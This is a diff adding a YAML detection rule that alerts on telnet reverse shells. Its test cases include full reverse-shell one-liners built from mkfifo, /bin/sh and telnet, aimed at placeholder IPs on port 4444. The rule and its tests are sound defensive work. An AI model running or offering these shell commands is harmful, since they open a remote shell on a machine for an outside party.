@@ -1,0 +1,31 @@
+name: rta_telnet_reverse_shell
+mode: alert
+eval: |
+  (
+    e.process_name == "telnet" &&
+    re_match(e.process_args, "[0-9.]+\\s+[0-9]+") &&
+    (
+      re_match(e.process_args, "mkfifo") ||
+      re_match(e.process_args, "\\|") ||
+      e.process_pname == "sh" ||
+      e.process_pname == "bash"
+    )
+  )
+tests:
+  - cleartext: "telnet reverse shell with mkfifo"
+    process_name: telnet
+    process_args: "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | telnet 10.10.10.10 4444 > /tmp/s"
+    should_match: true
+  - cleartext: "telnet spawned from bash"
+    process_name: telnet
+    process_pname: bash
+    process_args: "telnet 192.168.1.1 8080"
+    should_match: true
+  - cleartext: "telnet with pipe"
+    process_name: telnet
+    process_args: "/bin/sh | telnet 10.0.0.1 4444"
+    should_match: true
+  - cleartext: "normal telnet to server"
+    process_name: telnet
+    process_args: "telnet example.com"
+    should_match: false
